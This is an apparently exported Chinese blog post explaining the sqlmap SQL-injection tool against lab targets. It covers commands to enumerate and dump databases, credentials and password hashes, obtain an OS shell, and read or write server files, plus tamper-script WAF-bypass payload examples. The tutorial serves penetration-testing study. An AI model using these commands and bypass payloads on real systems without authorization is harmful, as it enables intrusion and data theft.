{"title":"渗透测试工具-sqlmap详解","uid":"a6aaa0ab5b2e8cb7c48d0382e4a8493d","slug":"sqlmap详解","date":"2023-01-13T03:16:07.165Z","updated":"2023-02-01T03:55:28.117Z","comments":true,"path":"api/articles/sqlmap详解.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/wallhaven-496wr8.jpg","content":"<p>谈到渗透测试就离不开sql注入，谈到sql注入就离不开sqlmap，本文旨在介绍sqlmap这款强大的自动化sql注入工具的使用，未来也会根据自己实际遇到的情况进行更新，话不多说，直接开整</p>\n<h2 id=\"sqlmap介绍\"><a href=\"#sqlmap介绍\" class=\"headerlink\" title=\"sqlmap介绍\"></a>sqlmap介绍</h2><p>其实对于sqlmap这款工具不需要过多介绍了，网上一搜一大把，这里还是简单提一下</p>\n<p>sqlmap是一个自动化的sql注入工具，其主要功能是扫描、发现并利用给定URL的SQL注入漏洞，内置了很多绕过插件，支持的数据库有MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB。<br>sqlmap支持五种不同的注入模式：</p>\n<ul>\n<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</li>\n<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li>\n<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li>\n<li>联合查询注入，可以使用union的情况下的注入；</li>\n<li>堆查询注入，可以同时执行多条语句的执行时的注入</li>\n</ul>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>比较详细的sqlmap配置及使用文章</p>\n<p><a href=\"https://blog.csdn.net/qq_51768842/article/details/123485836?spm=1001.2014.3001.5502\">https://blog.csdn.net/qq_51768842/article/details/123485836?spm=1001.2014.3001.5502</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/377428620\">https://zhuanlan.zhihu.com/p/377428620</a></p></blockquote>\n<h2 id=\"sqlmap入门\"><a href=\"#sqlmap入门\" class=\"headerlink\" title=\"sqlmap入门\"></a>sqlmap入门</h2><p>注意我这里是在kali环境下使用的sqlmap,所以可以直接使用,Windows需要添加环境变量等操作</p>\n<h3 id=\"判断是否存在注入\"><a href=\"#判断是否存在注入\" class=\"headerlink\" title=\"判断是否存在注入\"></a>判断是否存在注入</h3><p>假设目标的url是<code>http://127.0.0.1/sql/Less-1/?id=1</code></p>\n<p>那么判断命令就是<code>sqlmap -u http://127.0.0.1/sql/Less-1/?id=1 </code></p>\n<p>当注入点后面参数大于两个是,需要加双引号,如下:</p>\n<p><code>sqlmap -u &quot;http://127.0.0.1/sql/Less-1/?id=1&amp;uid=2&quot;</code></p>\n<h3 id=\"判断文本中的请求是否存在注入\"><a href=\"#判断文本中的请求是否存在注入\" class=\"headerlink\" title=\"判断文本中的请求是否存在注入\"></a>判断文本中的请求是否存在注入</h3><p>从文件中加载HTTP请求，SQLMap可 以从一个文本文件中获取HTTP请求，这样就可以不设置其他参数(如cookie、POST数据等)，txt文件中的内容为Web数据包，</p>\n<p>这个文本文件通常可以用burp suite生成</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230201104729660.png\" alt=\"image-20230201104729660\"></p>\n<p>判断是否存在注入的命令如下所示，运行后的结果如图所示，-r- -般在存在cookie注入时使用。</p>\n<p><code>sqlmap -r sql.txt</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/image-20230201111757018.png\" alt=\"image-20230201111757018\"></p>\n<p><strong>查询当前用户的所有数据库</strong></p>\n<p><code>sqlmap.py -u http://192. 168.1.104/sq11/Less-1/?id=1 --dbs</code></p>\n<p>当继续注入时,–dbs缩写成 -D xxx ，其意思是在 xx数据库中继续查询其他数据</p>\n<p><strong>获取数据库中的表名</strong></p>\n<p><code>sq1map.py -u &quot;http://192.168.1.7/sq1/union. php?id=1&quot; -D dkeye --tables</code></p>\n<p>当继续注入时，–tables缩 写成-T，意思是在某表中继续查询。</p>\n<p><strong>获取表中的字段名</strong></p>\n<p><code>sqlmap.py -u &quot;http://192.168.1. 7/sq1/ union. php?id=1&quot; -D dkeye -T user_ info --columns</code></p>\n<p>在后续的注入中，–columns缩写成-C。</p>\n<p><strong>获取字段内容</strong></p>\n<p><code>sqlmap.py -U &quot;http:/ /192.168.1.7/sq1/union. php?id=1&quot; -D dkeye -T user_ info -C username , password -- dump</code></p>\n<p><strong>获取数据库的所有用户</strong></p>\n<p>该命令的作用是列出数据库的所有用户，如下所示。在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有管理用户。</p>\n<p><code>sqlmap.py -u &quot;http://192. 168.1.7/sq1/union. php?id=1&quot; --users</code></p>\n<p><strong>获取数据库用户的密码</strong></p>\n<p>该命令的作用是列出数据库用户的密码，如下所示,如果当前用户有读取包含用户密码的权限， SQLMap会先列举出用户，然后列出Hash ，并尝试破解</p>\n<p><code>sqlmap.py -u http://192.168.1.7/sq1/union. php?id=1&quot; --passwords</code></p>\n<p><strong>获取当前网站的数据库的名称</strong></p>\n<p><code>sqlmap.py -u &quot;http://192.168.1.7/sq1/union. php?id=1&quot; --current-db</code></p>\n<p><strong>获取当前网站数据库的用户名称</strong></p>\n<p><code>sqlmap.py -u http://192.168.1.7/sq1/union. php?id=1&quot; --current-user</code></p>\n<h2 id=\"sqlmap进阶\"><a href=\"#sqlmap进阶\" class=\"headerlink\" title=\"sqlmap进阶\"></a>sqlmap进阶</h2><p>具体可以参看<strong>Web安全攻防：渗透测试实战指南</strong>中的sqlmap进阶篇，篇幅太长就不详解了</p>\n<p>1&gt;探测等级： –level 5</p>\n<p>–level 5 指的是需要执行的测试等级</p>\n<p>一共有5个等级（1-5） 不加 level 时，默认是1</p>\n<p>5级包含的payload最多，会自动破解出cookie、XFF等头部注入，相对应他的速度也比较慢。</p>\n<p>level&#x3D;2 http cookie会测试</p>\n<p>level&#x3D;3 http user-agent&#x2F;referer头会测试</p>\n<p>在不能确定哪个payload或参数为注入点时，建议使用高的level值。</p>\n<p>2&gt;当前用户是否为管理权限： –is -dba</p>\n<p>返回true则为是管理权限，否则不是</p>\n<p>3&gt;列出数据库管理员角色： –roles</p>\n<p>注意：只适用于当前数据库是oracle的时候</p>\n<p>4&gt;HTTP Referer头: –referer</p>\n<p>当level设置为3时，会尝试referer注入</p>\n<p>也可以使用referer命令来欺骗 例如：</p>\n<p>–referer 域名（<a href=\"https://www.baidu.com)/\">https://www.baidu.com）</a></p>\n<p>5&gt;运行自定义sql语句：–sql -shell</p>\n<p>例如：sqlmap.py -u “<a href=\"http://192.168.1.xxx/sql1/union.php?id=1%E2%80%9D\">http://192.168.1.xxx/sql1/union.php?id=1”</a> –sql -shell</p>\n<p>6&gt;运行任意操作系统命令： –os -cmd </p>\n<p>​                       –os -shell</p>\n<p>用 –os -shell参数可以模拟一个真实的shell，输入想执行的命令</p>\n<p>支持asp、asp.net、jsp、php四种语言</p>\n<p>7&gt;从数据库服务器中读取文件 –file-read  ” 路径“</p>\n<p>8&gt;上传文件到数据库服务器中 –file-write</p>\n<p>​                         –file-dest</p>\n<p>用于写入本地文件到服务器中，当数据库为mysql、postgresql、microsoft sql server，且当前用户有权限使用特定函数时，上传的文件可以是文本也可以是二进制文件。</p>\n<p>6.sqlmap自带绕过脚本tamper的讲解</p>\n<p>sqlmap在默认情况下除了使用char()函数防止出现单引号，没有对注入的数据进行修改。</p>\n<p>tamper参数对数据做修改来绕过WAF等设备，其中大部分脚本主要用正则模块替换攻击载荷字符编码的方式尝试绕过WAF的检测规则。</p>\n<p>常用的tamper脚本：</p>\n<p>apostrophemask.py</p>\n<p>适用数据库：ALL </p>\n<p>作用：将引号替换为utf-8，用于过滤单引号 </p>\n<p>使用脚本前：tamper(“1 AND ‘1’&#x3D;’1”) </p>\n<p>使用脚本后：1 AND %EF%BC%871%EF%BC%87&#x3D;%EF%BC%871</p>\n<p>base64encode.py</p>\n<p>适用数据库：ALL </p>\n<p>作用：替换为base64编码 </p>\n<p>使用脚本前：tamper(“1’ AND SLEEP(5)#”) </p>\n<p>使用脚本后：MScgQU5EIFNMRUVQKDUpIw&#x3D;&#x3D;</p>\n<p>multiplespaces.py</p>\n<p>适用数据库：ALL </p>\n<p>作用：围绕sql关键字添加多个空格 </p>\n<p>使用脚本前：tamper(‘1 UNION SELECT foobar’) </p>\n<p>使用脚本后：1 UNION SELECT foobar</p>\n<p>space2plus.py</p>\n<p>适用数据库：ALL </p>\n<p>作用：用加号替换空格 </p>\n<p>使用脚本前：tamper(‘SELECT id FROM users’) </p>\n<p>使用脚本后：SELECT+id+FROM+users</p>\n<p>nonrecursivereplacement.py</p>\n<p>适用数据库：ALL </p>\n<p>作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空） </p>\n<p>使用脚本前：tamper(‘1 UNION SELECT 2–’) </p>\n<p>使用脚本后：1 UNIOUNIONN SELESELECTCT 2–</p>\n<p>space2randomblank.py</p>\n<p>适用数据库：ALL </p>\n<p>作用：将空格替换为其他有效字符 </p>\n<p>使用脚本前：tamper(‘SELECT id FROM users’) </p>\n<p>使用脚本后：SELECT%0Did%0DFROM%0Ausers</p>\n<p>unionalltounion.py</p>\n<p>适用数据库：ALL </p>\n<p>作用：将union allselect 替换为unionselect </p>\n<p>使用脚本前：tamper(‘-1 UNION ALL SELECT’) </p>\n<p>使用脚本后：-1 UNION SELECT</p>\n<p>securesphere.py</p>\n<p>适用数据库：ALL </p>\n<p>作用：追加特定的字符串 </p>\n<p>使用脚本前：tamper(‘1 AND 1&#x3D;1’) </p>\n<p>使用脚本后：1 AND 1&#x3D;1 and ‘0having’&#x3D;’0having’</p>\n<p>space2dash.py</p>\n<p>适用数据库：ALL </p>\n<p>作用：将空格替换为–，并添加一个随机字符串和换行符 </p>\n<p>使用脚本前：tamper(‘1 AND 9227&#x3D;9227’) </p>\n<p>使用脚本后：1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227&#x3D;9227</p>\n<p>space2mssqlblank.py</p>\n<p>适用数据库：Microsoft SQL Server </p>\n<p>测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005 </p>\n<p>作用：将空格随机替换为其他空格符号(‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’) </p>\n<p>使用脚本前：tamper(‘SELECT id FROM users’) </p>\n<p>使用脚本后：SELECT%0Eid%0DFROM%07users</p>\n<p>between.py</p>\n<p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 </p>\n<p>作用：用NOT BETWEEN 0 AND #替换&gt; </p>\n<p>使用脚本前：tamper(‘1 AND A &gt; B–’) </p>\n<p>使用脚本后：1 AND A NOT BETWEEN 0 AND B–</p>\n<p>percentage.py</p>\n<p>适用数据库：ASP </p>\n<p>测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0 </p>\n<p>作用：在每个字符前添加一个% </p>\n<p>使用脚本前：tamper(‘SELECT FIELD FROM TABLE’) </p>\n<p>使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p>\n<p>sp_password.py</p>\n<p>适用数据库：MSSQL </p>\n<p>作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password </p>\n<p>使用脚本前：tamper(‘1 AND 9227&#x3D;9227– ‘) </p>\n<p>使用脚本后：1 AND 9227&#x3D;9227– sp_password</p>\n<p>charencode.py</p>\n<p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 </p>\n<p>作用：对给定的payload全部字符使用url编码（不处理已经编码的字符） </p>\n<p>使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’) </p>\n<p>使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p>\n<p>randomcase.py</p>\n<p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 </p>\n<p>作用：随机大小写 </p>\n<p>使用脚本前：tamper(‘INSERT’) </p>\n<p>使用脚本后：INseRt</p>\n<p>charunicodeencode.py</p>\n<p>适用数据库：ASP、ASP.NET </p>\n<p>测试通过数据库：Microsoft SQL Server 2000&#x2F;2005、MySQL 5.1.56、PostgreSQL 9.0.3 </p>\n<p>作用：适用字符串的unicode编码 </p>\n<p>使用脚本前：tamper(‘SELECT FIELD%20FROM TABLE’) </p>\n<p>使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</p>\n<p>space2comment.py</p>\n<p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 </p>\n<p>作用：将空格替换为&#x2F;**&#x2F; </p>\n<p>使用脚本前：tamper(‘SELECT id FROM users’) </p>\n<p>使用脚本后：SELECT&#x2F;<strong>&#x2F;id&#x2F;</strong>&#x2F;FROM&#x2F;**&#x2F;users</p>\n<p>equaltolike.py</p>\n<p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5 </p>\n<p>作用：将&#x3D;替换为LIKE </p>\n<p>使用脚本前：tamper(‘SELECT * FROM users WHERE id&#x3D;1’) </p>\n<p>使用脚本后：SELECT * FROM users WHERE id LIKE 1</p>\n<p>equaltolike.py</p>\n<p>测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 </p>\n<p>作用：将&gt;替换为GREATEST，绕过对&gt;的过滤 </p>\n<p>使用脚本前：tamper(‘1 AND A &gt; B’) </p>\n<p>使用脚本后：1 AND GREATEST(A,B+1)&#x3D;A</p>\n<p>ifnull2ifisnull.py</p>\n<p>适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly) </p>\n<p>测试通过数据库：MySQL 5.0 and 5.5 </p>\n<p>作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤 </p>\n<p>使用脚本前：tamper(‘IFNULL(1, 2)’) </p>\n<p>使用脚本后：IF(ISNULL(1),2,1)</p>\n<p>modsecurityversioned.py</p>\n<p>适用数据库：MySQL </p>\n<p>测试通过数据库：MySQL 5.0 </p>\n<p>作用：过滤空格，使用mysql内联注释的方式进行注入 </p>\n<p>使用脚本前：tamper(‘1 AND 2&gt;1–’) </p>\n<p>使用脚本后：1 &#x2F;<em>!30874AND 2&gt;1</em>&#x2F;–</p>\n<p>space2mysqlblank.py</p>\n<p>适用数据库：MySQL </p>\n<p>测试通过数据库：MySQL 5.1 </p>\n<p>作用：将空格替换为其他空格符号(‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’) </p>\n<p>使用脚本前：tamper(‘SELECT id FROM users’) </p>\n<p>使用脚本后：SELECT%0Bid%0DFROM%0Cusers</p>\n<p>modsecurityzeroversioned.py</p>\n<p>适用数据库：MySQL </p>\n<p>测试通过数据库：MySQL 5.0 </p>\n<p>作用：使用内联注释方式（&#x2F;<em>!00000</em>&#x2F;）进行注入 </p>\n<p>使用脚本前：tamper(‘1 AND 2&gt;1–’) </p>\n<p>使用脚本后：1 &#x2F;<em>!00000AND 2&gt;1</em>&#x2F;–</p>\n<p>space2mysqldash.py</p>\n<p>适用数据库：MySQL、MSSQL </p>\n<p>作用：将空格替换为 – ，并追随一个换行符 </p>\n<p>使用脚本前：tamper(‘1 AND 9227&#x3D;9227’) </p>\n<p>使用脚本后：1–%0AAND–%0A9227&#x3D;9227</p>\n<p>bluecoat.py</p>\n<p>适用数据库：Blue Coat SGOS </p>\n<p>测试通过数据库：MySQL 5.1,、SGOS </p>\n<p>作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换&#x3D; </p>\n<p>使用脚本前：tamper(‘SELECT id FROM users where id &#x3D; 1’) </p>\n<p>使用脚本后：SELECT%09id FROM users where id LIKE 1</p>\n<p>versionedkeywords.py</p>\n<p>适用数据库：MySQL </p>\n<p>测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11 </p>\n<p>作用：注释绕过 </p>\n<p>使用脚本前：tamper(‘1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#’) </p>\n<p>使用脚本后：1&#x2F;<em>!UNION</em>&#x2F;&#x2F;<em>!ALL</em>&#x2F;&#x2F;<em>!SELECT</em>&#x2F;&#x2F;<em>!NULL</em>&#x2F;,&#x2F;<em>!NULL</em>&#x2F;, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()&#x2F;<em>!AS</em>&#x2F;&#x2F;<em>!CHAR</em>&#x2F;),CHAR(32)),CHAR(58,100,114,117,58))#</p>\n<p>halfversionedmorekeywords.py</p>\n<p>适用数据库：MySQL &lt; 5.1 </p>\n<p>测试通过数据库：MySQL 4.0.18&#x2F;5.0.22 </p>\n<p>作用：在每个关键字前添加mysql版本注释 </p>\n<p>使用脚本前：tamper(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’&#x3D;’QDWa”) </p>\n<p>使用脚本后：value’&#x2F;<em>!0UNION&#x2F;</em>!0ALL&#x2F;<em>!0SELECT&#x2F;</em>!0CONCAT(&#x2F;<em>!0CHAR(58,107,112,113,58),&#x2F;</em>!0IFNULL(CAST(&#x2F;<em>!0CURRENT_USER()&#x2F;</em>!0AS&#x2F;<em>!0CHAR),&#x2F;</em>!0CHAR(32)),&#x2F;<em>!0CHAR(58,97,110,121,58)),&#x2F;</em>!0NULL,&#x2F;<em>!0NULL#&#x2F;</em>!0AND ‘QDWa’&#x3D;’QDWa</p>\n<p>space2morehash.py</p>\n<p>适用数据库：MySQL &gt;&#x3D; 5.1.13 </p>\n<p>测试通过数据库：MySQL 5.1.41 </p>\n<p>作用：将空格替换为#，并添加一个随机字符串和换行符 </p>\n<p>使用脚本前：tamper(‘1 AND 9227&#x3D;9227’) </p>\n<p>使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227&#x3D;9227</p>\n<p>apostrophenullencode.py</p>\n<p>适用数据库：ALL </p>\n<p>作用：用非法双字节Unicode字符替换单引号 </p>\n<p>使用脚本前：tamper(“1 AND ‘1’&#x3D;’1”) </p>\n<p>使用脚本后：1 AND %00%271%00%27&#x3D;%00%271</p>\n<p>appendnullbyte.py</p>\n<p>适用数据库：ALL </p>\n<p>作用：在有效载荷的结束位置加载null字节字符编码 </p>\n<p>使用脚本前：tamper(‘1 AND 1&#x3D;1’) </p>\n<p>使用脚本后：1 AND 1&#x3D;1%00</p>\n<p>chardoubleencode.py</p>\n<p>适用数据库：ALL </p>\n<p>作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符） </p>\n<p>使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’) </p>\n<p>使用脚本后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</p>\n<p>unmagicquotes.py</p>\n<p>适用数据库：ALL </p>\n<p>作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格 </p>\n<p>使用脚本前：tamper(“1’ AND 1&#x3D;1”) </p>\n<p>使用脚本后：1%bf%27 AND 1&#x3D;1–</p>\n<p>randomcomments.py</p>\n<p>适用数据库：ALL </p>\n<p>作用：用注释符分割sql关键字 </p>\n<p>使用脚本前：tamper(‘INSERT’) </p>\n<p>使用脚本后：I&#x2F;**&#x2F;N&#x2F;**&#x2F;SERT</p>\n","text":"谈到渗透测试就离不开sql注入，谈到sql注入就离不开sqlmap，本文旨在介绍sqlmap这款强大的自动化sql注入工具的使用，未来也会根据自己实际遇到的情况进行更新，话不多说，直接开整 sqlmap介绍其实对于sqlmap这款工具不需要过多介绍了，网上一搜一大把，这里还是简单...","link":"","photos":[],"count_time":{"symbolsCount":"9.5k","symbolsTime":"9 mins."},"categories":[{"name":"渗透从入门到入土","slug":"渗透从入门到入土","count":10,"path":"api/categories/渗透从入门到入土.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":3,"path":"api/tags/渗透测试.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sqlmap%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">sqlmap介绍</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sqlmap%E5%85%A5%E9%97%A8\"><span class=\"toc-text\">sqlmap入门</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">判断是否存在注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A4%E6%96%AD%E6%96%87%E6%9C%AC%E4%B8%AD%E7%9A%84%E8%AF%B7%E6%B1%82%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">判断文本中的请求是否存在注入</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sqlmap%E8%BF%9B%E9%98%B6\"><span class=\"toc-text\">sqlmap进阶</span></a></li></ol>","author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"PHP编程与开发","uid":"20917cafe9bad9b66ec14a8de4e80fe8","slug":"PHP编程与开发","date":"2023-02-01T02:09:04.026Z","updated":"2023-02-01T02:08:35.170Z","comments":true,"path":"api/articles/PHP编程与开发.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/wallhaven-vq9kjl.png","text":"PHP基本使用PHP基础PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言 PHP 是什么？ PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。 PHP 脚本在服务器上执行。 PHP 可免费下载使用。...","link":"","photos":[],"count_time":{"symbolsCount":"28k","symbolsTime":"26 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":10,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"php","slug":"php","count":5,"path":"api/tags/php.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}},"next_post":{"title":"系统安全-Linux操作系统","uid":"ba8a2682be8b63e52959cbada397fdd0","slug":"Linux操作系统","date":"2023-01-12T04:13:11.493Z","updated":"2023-02-11T02:01:45.434Z","comments":true,"path":"api/articles/Linux操作系统.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-zyx9lw.jpg","text":"一:Linux操作系统概述Linux操作系统介绍及作用介绍​ 目前业界客户端大多采用Windows系统，而服务端大多数使用的是Linux，究其根源主要是开源免费，安全性高，支持多用户，支持关闭任意不需要的功能和对硬件资源要求低等因素。同时，Linux也是众多开源产品首先支持的平台...","link":"","photos":[],"count_time":{"symbolsCount":"85k","symbolsTime":"1:17"},"categories":[{"name":"操作系统安全","slug":"操作系统安全","count":1,"path":"api/categories/操作系统安全.json"}],"tags":[{"name":"Linux","slug":"Linux","count":1,"path":"api/tags/Linux.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}}}